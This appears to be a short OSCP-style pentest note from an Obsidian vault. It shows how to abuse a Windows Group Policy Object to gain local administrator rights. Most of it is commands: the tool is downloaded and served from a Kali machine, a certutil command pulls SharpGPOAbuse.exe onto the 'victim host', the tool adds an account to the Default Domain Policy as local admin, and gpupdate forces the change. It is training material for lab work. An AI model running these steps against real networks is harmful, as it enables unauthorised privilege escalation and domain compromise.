https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master?source=post_page-----158516460860---------------------------------------
## Method : Add ourself as Local Administrator & forcing a policy update

```
wget https://github.com/byronkg/SharpGPOAbuse/raw/refs/heads/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
```

Host server with SharpGPOAbuse.exe
```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

Transfer into VICTIM HOST
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/SharpGPOAbuse.exe SharpGPOAbuse.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
On VICTIM HOST

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [user] --GPOName "Default Domain Policy"
```

[[[PowerView.ps1]]]

Then force policy update
```
gpupdate /force
```

---

![[Pasted image 20260817211312.png]]

This will add our account into localgroup administrators